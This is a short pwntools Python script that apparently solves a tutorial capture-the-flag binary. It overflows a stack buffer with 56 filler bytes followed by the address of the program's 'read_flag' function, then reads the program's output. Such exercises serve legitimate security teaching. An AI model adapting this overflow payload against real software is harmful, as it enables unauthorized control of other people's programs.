#!/usr/bin/env python3

from pwn import *
import struct

def print_lines(p):
    while True:
        try:
            out = p.recvline(timeout=1)
        except EOFError:
            break
        if not out:
            break
        print(out.decode())

elf = ELF("./pwntools-tutorials-level4.0")

read_flag_addr = elf.symbols['read_flag']

offset = 56

payload = b'A' * offset + p64(read_flag_addr)

p = process("./pwntools-tutorials-level4.0")

p.sendafter(b"Give me your input\n", payload)

print_lines(p)
p.interactive()
